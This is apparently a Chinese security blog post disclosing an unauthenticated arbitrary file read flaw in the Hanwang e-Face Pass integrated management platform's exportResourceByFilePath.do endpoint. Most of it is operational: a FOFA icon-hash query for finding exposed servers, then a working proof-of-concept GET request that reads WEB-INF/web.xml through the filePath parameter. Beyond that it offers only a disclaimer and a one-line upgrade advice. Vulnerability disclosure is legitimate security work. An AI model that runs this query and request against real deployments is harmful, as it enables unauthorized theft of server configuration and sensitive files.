> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk5MDYxODcwMA==&mid=2247483950&idx=1&sn=970c288f654adcdc1315375a64c0b374

#  汉王e脸通综合管理平台 exportResourceByFilePath.do 任意文件读取漏洞  
原创 zz  星络安全实验室   2025-07-20 07:11  
  
<table><tbody><tr><td data-colwidth="576"><section><span leaf="">免责声明:文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，未授权的攻击属于非法行为!文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责作者不为此承担任何责任，一旦造成后果请自行负责</span></section></td></tr></tbody></table>  
漏洞详情：  
  
汉王e脸通综合管理平台的exportResourceByFilePath.do接口存在未授权文件读取安全缺陷。攻击者能够绕过身份验证机制，通过精心构造的请求参数向该接口提交任意系统文件路径，从而导致服务器敏感信息被非法获取，严重威胁系统数据安全性和完整性  
  
漏洞复现：  
  
fofa：  

```
icon_hash=&#34;1380907357&#34;
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVfkiankw0tcSNyVgbWw5T3Cn32oK5onibRRWjWIPvVOkibya8nnH0PM7HkNCvibZ3l5fAC2mO1xzQ9XUQ/640?wx_fmt=png&from=appmsg "")  
  
poc：  

```
GET /manage/leaveList/exportResourceByFilePath.do?filePath=WEB-INF/web.xml HTTP/1.1
Host:xx
```

  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVfkiankw0tcSNyVgbWw5T3Cn5IW9ia7tTwibeKzib0lGGrAtVFoV5uQ9khpjHq0IETqM9nE2vibsszR0mg/640?wx_fmt=png&from=appmsg "")  
  
修复意见：  
  
关注厂商动态，升级至安全版本  
  
